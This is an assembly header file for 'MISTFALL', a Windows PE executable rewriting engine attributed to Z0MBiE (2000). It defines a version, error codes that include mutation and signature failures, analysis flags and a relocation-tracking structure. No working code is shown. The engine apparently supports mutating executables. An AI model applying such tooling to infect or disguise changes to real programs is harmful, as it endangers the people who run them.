
;----------------------------------------------------------------------------
;
;        MISTFALL    PE-EXE/DLL reversing engine   (x) 2000 Z0MBiE
;
;----------------------------------------------------------------------------

MISTFALL_VERSION        equ     0102h

;----------------------------------------------------------------------------

ERR_SUCCESS             equ     0
ERR_BADFILE             equ     1
ERR_SHORTSUX            equ     2
ERR_NOMEMORY            equ     3
ERR_DISASM              equ     4
ERR_MUTATE              equ     5
ERR_SIGMAN              equ     6

;----------------------------------------------------------------------------

FL_RVA                  equ     00000001h
FL_DELTA                equ     00000002h
FL_FIXUP                equ     00000004h
FL_LABEL                equ     00000008h
FL_OPCODE               equ     00000010h
FL_CODE                 equ     00000020h
FL_HAVEREL              equ     00000040h
FL_CREF                 equ     00000080h
FL_DREF                 equ     00000100h
FL_NEXT                 equ     00000200h
FL_ANALYZED             equ     00000400h
FL_SECTALIGN            equ     00000800h
FL_PHYS                 equ     00001000h
FL_PRESENT              equ     00002000h
FL_VPRESENT             equ     00004000h
FL_FORCEOBJALIGN        equ     00008000h
FL_FORCEFILEALIGN       equ     00010000h
FL_DATA                 equ     00020000h
FL_STOP                 equ     00040000h
FL_SIGNATURE            equ     00080000h
FL_USER1                equ     10000000h
FL_USER2                equ     20000000h
FL_USER3                equ     40000000h
FL_RES8                 equ     80000000h

;----------------------------------------------------------------------------

hooy_struc              struc
h_flags                 dd      ?
h_oldrva                dd      ?
h_newrva                dd      ?
h_newofs                dd      ?
h_datalen               dd      ?
h_dataptr               dd      ?       ; BYTE*
h_arg1                  dd      ?
h_arg2                  dd      ?
h_next                  dd      ?       ; hooy*
                        ends

;----------------------------------------------------------------------------
